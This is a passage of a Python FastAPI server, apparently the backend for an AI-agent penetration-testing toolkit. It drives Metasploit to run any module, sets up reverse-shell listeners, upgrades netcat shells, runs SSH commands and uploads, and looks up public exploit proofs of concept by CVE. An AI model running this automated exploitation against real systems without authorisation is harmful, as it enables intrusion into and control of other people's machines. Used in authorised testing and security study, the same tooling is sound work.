    return ojson({"session_id": req.session_id, "output": output, "alive": sess.alive})

@app.get("/api/session/list")
async def session_list():
    """List all active PTY sessions with metadata."""
    return ojson({
        "sessions": [
            {
                "id": sid,
                "type": s.session_type,
                "target": s.target,
                "alive": s.alive,
                "metadata": s.metadata,
                "uptime_sec": round(time.monotonic() - s.created_at, 1),
            }
            for sid, s in _pty_sessions.items()
        ]
    })


@app.get("/api/session/{session_id}/status")
async def session_status(session_id: str):
    """Return structured status for a session: is_alive, metadata, uptime, pid.
    BUG-FIX: Does NOT consume buffer data — uses queue size as indicator only."""
    sess = _pty_sessions.get(session_id)
    if not sess:
        raise HTTPException(404, f"Session {session_id} not found")
    return ojson({
        "session_id": session_id,
        "is_alive":   sess.alive,
        "type":       sess.session_type,
        "target":     sess.target,
        "metadata":   sess.metadata,
        "uptime_sec": round(time.monotonic() - sess.created_at, 1),
        "buffered_chunks": sess._buf.qsize(),  # non-destructive peek
        "pid":        sess.pid,
    })

@app.delete("/api/session/{session_id}")
async def session_kill(session_id: str):
    """Kill and remove a PTY session."""
    sess = _pty_sessions.pop(session_id, None)
    if not sess:
        raise HTTPException(404, f"Session {session_id} not found")
    await sess.kill()
    return ojson({"killed": session_id})

@app.post("/api/session/msf_run")
async def msf_run(req: MsfRunReq):
    """
    UNIVERSAL Metasploit module runner — works for ALL module types:
      • exploit/*     — Exploits (reverse shells, bind shells, RCE, etc.)
      • auxiliary/*   — Scanners, fuzzers, brute-forcers, info gatherers
      • post/*        — Post-exploitation (privilege escalation, pivoting)
      • encoder/*     — Payload encoding
      • evasion/*     — AV evasion
      • exploit/multi/handler — Reverse shell listener

    Workflow:
      1. Flush output / confirm msf6 > prompt
      2. 'use <module>'
      3. Auto-detect module type and set required options:
         - Reverse payloads: auto-set LHOST + LPORT
         - Exploits with RHOSTS: set target
         - Auxiliary scanners: set RHOSTS + THREADS
         - Post modules: set SESSION
      4. Set PAYLOAD / TARGET / ACTION if provided
      5. Set all user-provided options
      6. 'run' or 'run -j' (background)
      7. Detect ALL session types opened (shell, meterpreter, VNC, etc.)
      8. Return structured result
    """
    MSF_PROMPT = "msf6 >"
    # All known MSF session-opened patterns (universal)
    # FIX: specific patterns MUST precede the generic catch-all or re.search
    # never reaches them ('PHP Meterpreter session 1 opened' matched 'generic').
    SESSION_PATTERNS = [
        (r'command shell session (\d+) opened',     'shell'),
        (r'PHP Meterpreter session (\d+) opened',    'php_meterpreter'),
        (r'Java Meterpreter session (\d+) opened',   'java_meterpreter'),
        (r'Python Meterpreter session (\d+) opened', 'python_meterpreter'),
        (r'meterpreter session (\d+) opened',        'meterpreter'),
        (r'VNC session (\d+) opened',                'vnc'),
        (r'session (\d+) opened',                    'generic'),  # catch-all LAST
    ]

    sess = _pty_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"Session {req.session_id} not found")
    if not sess.alive:
        raise HTTPException(400, f"Session {req.session_id} is not alive")

    all_output: List[str] = []
    sessions_opened: List[Dict[str, Any]] = []  # [{number, type}, ...]
    module_type = None  # 'exploit', 'auxiliary', 'post', etc.

    async def _send_wait(cmd: str, wait_timeout: float = 20.0,
                         wait_for: Optional[str] = None) -> str:
        """Send a command and wait for output.
        If wait_for is set, keeps reading until that string appears (or the
        timeout elapses) — otherwise returns on the idle-gap heuristic."""
        await sess.send(cmd)
        out = await sess.read(timeout=wait_timeout, wait_for=wait_for)
        all_output.append(f"msf6 > {cmd}\n{out}")

        # Detect ALL session types opened
        for pattern, stype in SESSION_PATTERNS:
            m = re.search(pattern, out, re.IGNORECASE)
            if m:
                sess_num = m.group(1)
                # Avoid duplicates
                if not any(s["number"] == sess_num for s in sessions_opened):
                    sessions_opened.append({"number": sess_num, "type": stype})
                    sess.metadata["exploit"] = req.module
                    sess.metadata["shell_type"] = stype
        return out

    # 1. Flush any pending output / confirm prompt is live
    _ = await sess.read(timeout=5.0, wait_for=MSF_PROMPT)

    # 2. use <module>
    use_out = await _send_wait(f"use {req.module}")

    # Auto-detect module type from prompt change
    # After 'use exploit/...', prompt changes to 'msf6 exploit(unix/ftp/vsftpd_234_backdoor) >'
    if "exploit(" in use_out or req.module.startswith("exploit/"):
        module_type = "exploit"
    elif "auxiliary(" in use_out or req.module.startswith("auxiliary/"):
        module_type = "auxiliary"
    elif "post(" in use_out or req.module.startswith("post/"):
        module_type = "post"
    elif "encoder(" in use_out or req.module.startswith("encoder/"):
        module_type = "encoder"
    elif "evasion(" in use_out or req.module.startswith("evasion/"):
        module_type = "evasion"
    elif "nop(" in use_out or req.module.startswith("nop/"):
        module_type = "nop"
    else:
        module_type = "unknown"

    # 3. Auto-set options based on module type
    # LHOST auto-detection: get Adara's IP for reverse payloads.
    # FIX: blocking subprocess.run/ip/gethostbyname ran ON the event loop
    # (freezing every request and PTY pump for up to ~6s); now runs in a
    # thread and caches the result.
    lhost = req.lhost
    if not lhost and req.payload and "reverse" in req.payload:
        import socket
        try:
            lhost = await asyncio.to_thread(socket.gethostbyname, socket.gethostname())
            # Prefer non-127.x address (VPN/tunnel interfaces first)
            for iface_name in ["tun0", "eth0", "wlan0"]:
                try:
                    import subprocess as _sp
                    r = await asyncio.to_thread(
                        _sp.run, ["ip", "-4", "addr", "show", iface_name],
                        capture_output=True, text=True, timeout=2)
                    m2 = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout)
                    if m2 and not m2.group(1).startswith("127."):
                        lhost = m2.group(1)
                        break
                except Exception:
                    pass
        except Exception:
            lhost = "127.0.0.1"

    lport = req.lport if req.lport else 4444

    # Set user-provided options first
    for k, v in req.options.items():
        await _send_wait(f"set {k} {v}")

    # Auto-set payload if specified
    if req.payload:
        await _send_wait(f"set PAYLOAD {req.payload}")
        # Auto-set LHOST/LPORT for reverse payloads
        if "reverse" in req.payload:
            await _send_wait(f"set LHOST {lhost}")
            await _send_wait(f"set LPORT {lport}")

    # Auto-set TARGET for multi-target exploits
    if req.target_idx is not None:
        await _send_wait(f"set TARGET {req.target_idx}")

    # Auto-set ACTION for auxiliary modules
    if req.action:
        await _send_wait(f"set ACTION {req.action}")

    # For auxiliary scanners, auto-set THREADS if not already set
    if module_type == "auxiliary" and "THREADS" not in req.options:
        await _send_wait("set THREADS 10")

    # 4. Run the module
    run_cmd = "run -j" if req.run_bg else "run"
    # FIX: for a foreground run, wait for the msf6 prompt to come back — that's
    # the real 'module finished' signal. The old code returned after 0.4s of
    # quiet output, truncating long exploits that pause mid-run and reporting
    # success=False with a partial transcript.
    run_out = await _send_wait(run_cmd, wait_timeout=req.module_timeout,
                               wait_for=None if req.run_bg else MSF_PROMPT)

    combined = "\n".join(all_output)

    # 5. Final session detection pass on full combined output
    if not sessions_opened:
        for pattern, stype in SESSION_PATTERNS:
            for m in re.finditer(pattern, combined, re.IGNORECASE):
                sess_num = m.group(1)
                if not any(s["number"] == sess_num for s in sessions_opened):
                    sessions_opened.append({"number": sess_num, "type": stype})
                    sess.metadata["exploit"] = req.module
                    sess.metadata["shell_type"] = stype

    # 6. Determine privilege from output
    priv = None
    if "uid=0(root)" in combined or "NT AUTHORITY\\SYSTEM" in combined:
        priv = "root"
        sess.metadata["is_root"] = True
    elif re.search(r'uid=\d+\((\w+)\)', combined):
        m_user = re.search(r'uid=\d+\((\w+)\)', combined)
        priv = m_user.group(1) if m_user else None

    # 7. Detect exploit failure patterns (init FIRST — death-mode block below
    # references it; the old order raised UnboundLocalError exactly on the
    # death-mode path it was meant to handle)
    failure_reasons = []
    if "Exploit failed" in combined or "exploit failed" in combined.lower():
        failure_reasons.append("exploit_failed")
    if "The target is not vulnerable" in combined or "not vulnerable" in combined.lower():
        failure_reasons.append("not_vulnerable")
    if "No encoders encoded the buffer" in combined:
        failure_reasons.append("encoder_failed")
    if "Module failed" in combined:
        failure_reasons.append("module_error")
    if "could not connect" in combined.lower() or "connection refused" in combined.lower():
        failure_reasons.append("connection_failed")
    if "timed out" in combined.lower():
        failure_reasons.append("timeout")

    # FIX (H8): 'death mode' — exploit textually succeeded ('Exploit completed')
    # but no session materialized. The old response said success=False with no
    # hint; the agent would re-run the same broken command forever. Give it the
    # distinct failure_reason + next steps so it can self-correct (LHOST etc.).
    death_mode = (module_type == "exploit" and not sessions_opened
                  and ("Exploit completed" in combined or "successfully executed" in combined.lower()))
    if death_mode:
        failure_reasons.append("exploit_completed_no_session")
        hints = []
        if req.payload and "reverse" in req.payload:
            hints.append("session never called back — verify LHOST is reachable from target (check VPN/tun0 IP)")
        hints.append("target may lack outbound connectivity; try a bind payload or port forward")
        hints.append("staging failure possible — re-run with different payload or increase module_timeout")
        response_extra = {"session_created": False, "death_mode": True, "next_steps": hints}
    else:
        response_extra = {"session_created": len(sessions_opened) > 0, "death_mode": False}

    if combined:
        await _db.save_finding("metasploit", "msfconsole", module_type or "exploit",
                         f"MSF {module_type}: {req.module}", raw_output=combined,
                         scan_command=f"msf_run module={req.module}")

    combined_window = combined
    if combined and len(combined) > 20000:
        combined_window = combined[:20000] + "\n...[trimmed]"

    # Auto-CVE/PoC enrichment (FIX M3): MSF module output (banner grabs,
    # ssh_version, smtp_version, auxiliary fingerprinters...) leaks the same
    # service+version fingerprints → same CVE/PoC hook as every other tool.
    enrich: Dict[str, Any] = {}
    rhost = req.options.get("RHOSTS") or req.options.get("RHOST") or ""
    if rhost and combined:
        try:
            enrich = await _enrich_stdout(
                rhost, f"msf_run module={req.module}", combined)
        except Exception as e:
            logger.debug(f"auto-CVE enrichment skipped: {e}")

    return ojson({
        "session_id":       req.session_id,
        "module":           req.module,
        "module_type":      module_type,
        "output":           combined_window,
        "alive":            sess.alive,
        "success":          len(sessions_opened) > 0,
        "sessions_opened":  sessions_opened,   # [{number: "1", type: "meterpreter"}, ...]
        "session_count":    len(sessions_opened),
        "privilege":        priv,
        "target":           req.options.get("RHOSTS", ""),
        "payload":          req.payload or None,
        "lhost":            lhost if req.payload and "reverse" in req.payload else None,
        "lport":            lport if req.payload and "reverse" in req.payload else None,
        "failure_reasons":  failure_reasons,
        "background":       req.run_bg,
        **enrich,
        **response_extra,
    })


@app.post("/api/session/msf_search")
async def msf_search(req: MsfSearchReq):
    """
    Search Metasploit modules by keyword/type/platform.
    Examples:
      - query='type:exploit platform:linux ftp'
      - query='name:vsftpd'
      - query='type:auxiliary scanner smb'
      - query='cve:2021-44228'
    """
    sess = _pty_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"Session {req.session_id} not found")
    if not sess.alive:
        raise HTTPException(400, f"Session {req.session_id} is not alive")

    # Flush output
    _ = await sess.read(timeout=3.0, wait_for="msf6 >")

    await sess.send(f"search {req.query}")
    out = await sess.read(timeout=30.0, wait_for="msf6 >")

    # Parse search results into structured list
    modules = []
    for line in out.splitlines():
        line = line.strip()
        # MSF search output: '#  Name                                    Disclosed  Rank    Check  Description'
        m = re.match(r'^(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$', line)
        if m:
            modules.append({
                "rank": m.group(4),
                "name": m.group(2),
                "disclosed": m.group(3),
                "check": m.group(5),
                "description": m.group(6).strip(),
            })
        elif '/' in line and not line.startswith('#') and not line.startswith('-'):
            # Simpler fallback parse
            modules.append({"name": line.split()[0] if line.split() else line, "raw": line})

    return ojson({
        "session_id": req.session_id,
        "query": req.query,
        "modules": modules[:50],
        "count": len(modules),
        "modules_truncated": len(modules) > 50,
        # keep a short raw tail only — a 500-module dump floods context
        "raw_output": out[-4000:],
    })


@app.post("/api/session/msf_info")
async def msf_info(req: MsfInfoReq):
    """
    Get module info and required/optional settings.
    Runs 'info <module>' and 'show options' inside the MSF console.
    Returns structured data: name, description, authors, references,
                              required options with current values.
    """
    sess = _pty_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"Session {req.session_id} not found")
    if not sess.alive:
        raise HTTPException(400, f"Session {req.session_id} is not alive")

    # Flush
    _ = await sess.read(timeout=3.0, wait_for="msf6 >")

    # Run 'use' then 'show options' for structured output
    # FIX: wait for the actual 'msf6' prompt, not just '>' — a '>' appearing
    # inside the options table (e.g. '=>' in a value) truncated reads early.
    await sess.send(f"use {req.module}")
    use_out = await sess.read(timeout=15.0, wait_for="msf6")

    await sess.send("show options")
    opts_out = await sess.read(timeout=15.0, wait_for="msf6")

    # Parse options table
    # Columns: Name | Current Setting | Required | Description
    # FIX: split(None,3) collapses a BLANK Current Setting column — exactly the
    # required-but-unset case — making parts[1]='yes' and parts[2]=description
    # start. Handle the 3-field (blank current) shape explicitly.
    options = []
    for line in opts_out.splitlines():
        line = line.strip()
        if not line or line.startswith('Name') or line.startswith('-'):
            continue
        parts = line.split(None, 3)
        if len(parts) >= 3:
            if len(parts) == 3 and parts[1].lower() in ("yes", "no"):
                options.append({
                    "name": parts[0], "current": "",
                    "required": parts[1].lower() == "yes",
                    "description": parts[2],
                })
            else:
                options.append({
                    "name": parts[0],
                    "current": parts[1],
                    "required": parts[2].lower() == "yes",
                    "description": parts[3] if len(parts) > 3 else '',
                })

    # Get available payloads for exploit modules
    payloads_out = ""
    if req.module.startswith("exploit/"):
        await sess.send("show payloads")
        payloads_out = await sess.read(timeout=15.0, wait_for="msf6")

    # Get available targets
    targets_out = ""
    await sess.send("show targets")
    targets_out = await sess.read(timeout=10.0, wait_for="msf6")

    # Back to main prompt
    await sess.send("back")
    await sess.read(timeout=5.0, wait_for="msf6 >")

    return ojson({
        "session_id":  req.session_id,
        "module":      req.module,
        # raw copies windowed — parsed options above is the real payload
        "info_raw":    (use_out or "")[:4000],
        "options_raw": (opts_out or "")[:4000],
        "options":     options,
        "payloads_raw": (payloads_out or "")[:4000] if payloads_out else None,
        "targets_raw": (targets_out or "")[:4000] if targets_out else None,
    })



@app.post("/api/session/upgrade_shell")
async def upgrade_shell(req: UpgradeShellReq):
    """
    Auto-upgrade a dumb netcat reverse shell to a full PTY.
    Sends the standard Python pty + stty commands.
    """
    sess = _pty_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"Session {req.session_id} not found")

    upgrade_cmds = [
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "export TERM=xterm-256color",
        "export SHELL=bash",
        "stty rows 50 columns 200",
    ]
    outputs = []
    for cmd in upgrade_cmds:
        await sess.send(cmd)
        out = await sess.read(timeout=1.5)
        outputs.append({"cmd": cmd, "output": out})

    return ojson({"session_id": req.session_id, "upgrade_steps": outputs,
                  "message": "Shell upgraded to full PTY"})


# ─────────────────────────────────────────────
# SSH Session API
# ─────────────────────────────────────────────
@app.post("/api/ssh/connect")
async def ssh_connect(req: SSHConnectReq):
    """Establish a persistent SSH connection."""
    sid = str(uuid.uuid4())[:8]
    sess = SSHSession(sid, req.host, req.port)
    try:
        await sess.connect(req.username, req.password, req.key_path)
    except asyncssh.PermissionDenied:
        raise HTTPException(401, "SSH authentication failed: permission denied (bad username/password/key)")
    except asyncssh.DisconnectError as e:
        raise HTTPException(400, f"SSH disconnected: {e.reason or e}")
    except OSError as e:
        raise HTTPException(400, f"SSH connection failed (network): {e}")
    except Exception as e:
        raise HTTPException(400, f"SSH connection failed: {e}")
    _ssh_sessions[sid] = sess
    await _db.save_finding(req.host, "ssh", "access", f"SSH session connected as {req.username}",
                     scan_command=f"ssh {req.username}@{req.host} -p {req.port}")
    return ojson({"session_id": sid, "host": req.host, "port": req.port,
                  "username": req.username, "status": "connected"})

@app.post("/api/ssh/exec")
async def ssh_exec(req: SSHExecReq):
    """Execute a command in an SSH session."""
    sess = _ssh_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"SSH session {req.session_id} not found")
    result = await sess.exec(req.command, timeout=req.timeout)
    if result.get("stdout") and len(result["stdout"]) > 16000:
        out = result["stdout"]
        result["stdout"] = out[:16000] + f"\n...[trimmed {len(out)} bytes total]"
        result["stdout_truncated"] = True
    return ojson({"session_id": req.session_id, **result})

@app.post("/api/ssh/exec_interactive")
async def ssh_exec_interactive(req: SSHExecInteractiveReq):
    """Run a list of commands interactively (for su/sudo/passwd flows)."""
    sess = _ssh_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"SSH session {req.session_id} not found")
    output = await sess.exec_interactive(req.commands, req.delay)
    if output and len(output) > 16000:
        output = output[:16000] + "\n...[trimmed]"
    return ojson({"session_id": req.session_id, "output": output})

@app.post("/api/ssh/upload")
async def ssh_upload(req: SSHUploadReq):
    """Upload a file via SFTP.
    Supports TWO modes:
      1. Path-based:  local_path points to a file on the Adara server filesystem
      2. Content-based: file_content_b64 contains base64-encoded file bytes

    FIX: Content-based upload eliminates the need to first copy files to the server.
    """
    sess = _ssh_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"SSH session {req.session_id} not found")

    # ── Mode 2: Content-based upload (new -- avoids server-local file requirement)
    if req.file_content_b64:
        import base64, tempfile
        try:
            file_bytes = base64.b64decode(req.file_content_b64)
        except Exception:
            raise HTTPException(400, "Invalid base64 content in file_content_b64")
        # Write to a temp file on server, then SFTP upload
        fd, tmp_path = tempfile.mkstemp(prefix="ssh_upload_")
        try:
            os.write(fd, file_bytes)
            os.close(fd)
            await sess.upload_file(tmp_path, req.remote_path)
            return ojson({
                "uploaded": req.file_name or "from_content",
                "to": req.remote_path,
                "size_bytes": len(file_bytes),
                "success": True,
                "mode": "content_based",
            })
        except Exception as e:
            raise HTTPException(500, f"SFTP upload failed: {e}. Check remote path permissions.")
        finally:
            try:
                os.remove(tmp_path)
            except OSError:
                pass

    # ── Mode 1: Path-based upload (legacy -- file must exist on server)
    if not req.local_path:
        raise HTTPException(400, (
            "Either local_path (server filesystem path) or file_content_b64 "
            "(base64-encoded content) must be provided."
        ))
    if not os.path.exists(req.local_path):
        raise HTTPException(400, (
            f"Local file not found on server: {req.local_path}.\n"
            "The file must already exist on the Adara server. Options:\n"
            "1. Use file_content_b64 parameter to upload file content directly.\n"
            "2. First get the file onto the server: execute_command('wget -O /tmp/file URL')\n"
            "3. Or: execute_command('curl -o /tmp/file URL')\n"
            "Then use ssh_upload with local_path='/tmp/file'."
        ))
    if not os.path.isfile(req.local_path):
        raise HTTPException(400, f"Path is not a file: {req.local_path}")
    try:
        await sess.upload_file(req.local_path, req.remote_path)
        file_size = os.path.getsize(req.local_path)
        return ojson({
            "uploaded": req.local_path,
            "to": req.remote_path,
            "size_bytes": file_size,
            "success": True,
            "mode": "path_based",
        })
    except Exception as e:
        raise HTTPException(500, f"SFTP upload failed: {e}. Check remote path permissions.")

@app.post("/api/ssh/download")
async def ssh_download(req: SSHFileReq):
    """Download a file via SFTP."""
    sess = _ssh_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"SSH session {req.session_id} not found")
    # FIX: mirror ssh_upload — sftp.get raises SFTPError/OSError on a missing
    # remote path or unwritable local dir; unhandled it produced a raw 500
    try:
        await sess.download_file(req.remote_path, req.local_path)
    except Exception as e:
        raise HTTPException(500, f"SFTP download failed: {e}. Check remote path and local permissions.")
    return ojson({"downloaded": req.remote_path, "to": req.local_path})

@app.delete("/api/ssh/{session_id}")
async def ssh_close(session_id: str):
    sess = _ssh_sessions.pop(session_id, None)
    if not sess:
        raise HTTPException(404, f"SSH session {session_id} not found")
    await sess.close()
    return ojson({"closed": session_id})

@app.get("/api/ssh/list")
async def ssh_list():
    return ojson({
        "sessions": [
            {"id": sid, "host": s.host, "port": s.port, "alive": s.alive}
            for sid, s in _ssh_sessions.items()
        ]
    })


# ─────────────────────────────────────────────
# Findings / Memory API
# ─────────────────────────────────────────────
@app.post("/api/findings/save")
async def save_finding(req: FindingReq):
    # FIX: empty target / title previously inserted ghost rows (2 empty
    # rows observed under stress). Require non-blank identifiers.
    if not (req.target or "").strip():
        raise HTTPException(400, "target must be a non-empty string")
    if not (req.title or "").strip():
        raise HTTPException(400, "title must be a non-empty string")
    fid = await _db.save_finding(req.target, req.tool, req.category, req.title,
                                 req.detail, req.severity, req.raw_output,
                                 scan_command=req.scan_command)
    if fid < 0:
        # FIX: was silently reported as 'duplicate' — the evidence was NOT saved
        raise HTTPException(500, "Findings DB write failed — evidence was NOT saved")
    return ojson({"id": fid, "saved": fid > 0, "duplicate": fid == 0})

@app.post("/api/findings/status")
async def update_finding_status(req: FindingStatusReq):
    if req.status not in {"new", "confirmed", "false_positive", "remediated"}:
        raise HTTPException(400, f"Invalid status '{req.status}'. Use: new, confirmed, false_positive, remediated")
    ok = await _db.update_finding_status(req.finding_id, req.status)
    if not ok:
        raise HTTPException(404, f"Finding {req.finding_id} not found")
    return ojson({"finding_id": req.finding_id, "status": req.status, "updated": True})

def _prepare_findings(rows: List[Dict], raw: bool = False) -> List[Dict]:
    """Trim raw_output from finding rows unless explicitly requested.

    A findings list of 100 rows, each carrying a multi-MB scan log in
    raw_output, would destroy the agent's context window. The DB keeps the
    full evidence; the API serves it only on demand (and windowed)."""
    out = []
    for r in rows:
        d = dict(r)
        ro = d.get("raw_output") or ""
        # FIX: tiered findings keep raw '' inline + raw_len column — don't
        # recompute from the (empty) inline body.
        d["raw_len"] = int(d.get("raw_len") or 0) or len(ro)
        if raw and ro:
            w = _window_output(ro, head=2500, tail=1500, pre_stripped=True)
            d["raw_output"] = w["text"]
            d["raw_truncated"] = w["truncated"]
        else:
            d["raw_output"] = ""
        out.append(d)
    return out


@app.get("/api/findings")
async def get_findings(target: Optional[str] = None, status: Optional[str] = None,
                       limit: int = 2000, offset: int = 0, raw: bool = False):
    rows = _prepare_findings(await _db.get_findings(target, status, limit, offset), raw=raw)
    # FIX: include totals + severity breakdown so the agent can re-orient
    # (and know more rows exist) without pulling every finding row.
    return ojson({
        "findings":           rows,
        "count":              len(rows),
        "total":              await _db.count_findings(target, status),
        "counts_by_severity": await _db.counts_by_severity(target, status),
    })

@app.get("/api/findings/{finding_id}/raw")
async def finding_raw(finding_id: int, offset: int = 0, limit: int = 2000):
    """Page a finding's raw evidence — tier-aware (inline or finding_blobs).
    The list endpoints never carry 200KB; the blob lives here and is always
    fetched in small windows."""
    try:
        w = await _db.read_raw(finding_id, offset=offset, limit=limit)
    except KeyError:
        raise HTTPException(404, f"Finding {finding_id} not found")
    return ojson(w)

@app.get("/api/findings/search")
async def findings_search(q: str, target: Optional[str] = None, limit: int = 25):
    return ojson({"query": q, "findings": await _db.search_findings(q, target, limit)})

@app.get("/api/targets")
async def get_targets():
    return ojson({"targets": await _db.get_all_targets()})

# FIX: declared BEFORE /api/targets/{host} — a later declaration loses to the
# path-param route ('Target list not found' = get_target('list') captured it).
@app.get("/api/targets/list", include_in_schema=False)
async def api_targets_list_alias():
    return await get_targets()

@app.get("/api/targets/{host}")
async def get_target(host: str, raw: bool = False):
    t = await _db.get_target(host)
    if not t:
        raise HTTPException(404, f"Target {host} not found")
    findings = _prepare_findings(await _db.get_findings(host), raw=raw)
    return ojson({"target": t, "findings": findings})

@app.post("/api/targets/update")
async def update_target(req: TargetUpdateReq):
    await _db.update_target(req.host, os_guess=req.os_guess, open_ports=req.open_ports,
                            services=req.services, cves=req.cves, notes=req.notes,
                            open_ports_json=req.open_ports_json,
                            services_json=req.services_json,
                            cves_json=req.cves_json)
    return ojson({"updated": req.host})

@app.delete("/api/targets/{host}")
async def clear_target(host: str):
    await _db.clear_target(host)
    return ojson({"cleared": host})


# ─────────────────────────────────────────────
# Route aliases — kill the 404/405 flood.
# MCP clients (and curl explorers) probe several
# path variants; each previously 404/405'd because
# only the canonical route existed. Registered as
# direct handler aliases (no redirect hop) so the
# response is identical regardless of which is hit.
# ─────────────────────────────────────────────
@app.get("/api/health", include_in_schema=False)
async def api_health_alias():
    return await health_check()

@app.post("/api/findings", include_in_schema=False)
async def api_findings_post_alias(req: FindingReq):
    return await save_finding(req)

@app.post("/api/findings/add", include_in_schema=False)
async def api_findings_add_alias(req: FindingReq):
    return await save_finding(req)

@app.post("/api/findings/create", include_in_schema=False)
async def api_findings_create_alias(req: FindingReq):
    return await save_finding(req)

@app.post("/api/findings/new", include_in_schema=False)
async def api_findings_new_alias(req: FindingReq):
    return await save_finding(req)

@app.post("/api/save_finding", include_in_schema=False)
async def api_save_finding_alias(req: FindingReq):
    return await save_finding(req)

@app.post("/api/targets/upsert", include_in_schema=False)
async def api_targets_upsert_alias(req: TargetUpdateReq):
    return await update_target(req)


@app.delete("/api/findings/clear")
async def clear_all_findings():
    """Clear ALL findings, targets, and analyses from the server database."""
    try:
        conn = await _db._conn()
        await conn.execute("DELETE FROM findings")
        await conn.execute("DELETE FROM targets")
        await conn.execute("DELETE FROM analyses")
        await conn.commit()
        logger.info("All findings cleared from server DB")
        return ojson({"cleared": "all", "success": True})
    except Exception as e:
        raise HTTPException(500, f"Failed to clear findings: {e}")

@app.post("/api/analyses/save")
async def save_analysis(req: AnalysisSaveReq):
    aid = await _db.save_analysis(req.target, req.analysis, req.delta)
    return ojson({"analysis_id": aid, "saved": True})

@app.get("/api/analyses/{target}")
async def get_analysis_history(target: str, limit: int = 10):
    return ojson({"analyses": await _db.get_analysis_history(target, limit)})

@app.get("/api/report")
async def generate_report(target: Optional[str] = None, fmt: str = "json"):
    report = await _db.generate_report(target, fmt)
    return ojson(report)


# ─────────────────────────────────────────────
# PoC / CVE enrichment endpoints (proxy to cve_enrichment)
# ─────────────────────────────────────────────
if _HAS_CVE_ENRICHMENT:
    @app.post("/api/poc/search")
    async def poc_search(req: dict):
        """
        Search PoC repos for a CVE ID across all 7 sources:
        nomi-sec, ycdxsb, trickest/cve, GitHub Search API, sploitus,
        Metasploit+Nuclei, Vulhub Docker.
        Body: {"cve_id": "CVE-2021-44228"}
        """
        if not isinstance(req, dict):  # FIX10: JSON-array body → AttributeError 500
            raise HTTPException(400, "body must be a JSON object")
        cve_id = req.get("cve_id", "")
        if not cve_id:
            raise HTTPException(400, "Missing cve_id")
        result = await lookup_poc_all(cve_id)
        return ojson(result)

    @app.post("/api/cve/lookup")
    async def cve_lookup(req: dict):
        """
        Look up a CVE across ALL sources: NVD, Vulners, Exploit-DB,
        PoC repos, Metasploit, Nuclei, Vulhub Docker.
        Body: {"cve_id": "CVE-2021-44228"}
        """
        if not isinstance(req, dict):  # FIX10
            raise HTTPException(400, "body must be a JSON object")
        cve_id = req.get("cve_id", "")
        if not cve_id:
            raise HTTPException(400, "Missing cve_id")
        result = await lookup_cve_all(cve_id)
        return ojson(result)

    @app.post("/api/poc/bulk")
    async def poc_bulk_search(req: dict):
        """
        Search PoC repos for multiple CVE IDs simultaneously.
        Body: {"cve_ids": ["CVE-2021-44228", "CVE-2017-0144"]}
        """
        if not isinstance(req, dict):  # FIX10
            raise HTTPException(400, "body must be a JSON object")
        cve_ids = req.get("cve_ids", [])
        if not isinstance(cve_ids, list):  # FIX10: a string body iterates chars
            raise HTTPException(400, "cve_ids must be an array")
        cve_ids = cve_ids[:20]  # FIX: cap — 100 CVEs = 100*7s NVD serial
        if not cve_ids:
            raise HTTPException(400, "Missing cve_ids")
        results = await asyncio.gather(*[lookup_poc_all(c) for c in cve_ids],
                                       return_exceptions=True)
        # FIX: return_exceptions=True keeps Exception OBJECTS in the list —
        # json.dumps then raised → whole /api/poc/bulk 500'd on one bad CVE.
        out = []
        for cve_id, r in zip(cve_ids, results):
            if isinstance(r, Exception):
                out.append({"cve_id": cve_id, "error": str(r)[:300]})
            else:
                out.append(r)
        return ojson({"results": out, "count": len(out)})


# ─────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Adara Tools API Server v2")
    parser.add_argument("--port",  type=int, default=API_PORT)
    parser.add_argument("--host",  type=str, default=API_HOST)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    # Re-configure loguru to match the requested level
    if args.debug:
        logger.remove()
        logger.add(
            sys.stderr,
            format="<green>{time:HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{message}</cyan>",
            level="DEBUG",
            colorize=True,
        )

    log_level = "debug" if args.debug else "info"
    logger.info(f"Starting Adara API Server on {args.host}:{args.port}")
    uvicorn.run(
        "adara_server:app",
        host=args.host,
        port=args.port,
        log_level=log_level,
        reload=args.debug,
    )

if __name__ == "__main__":
    main()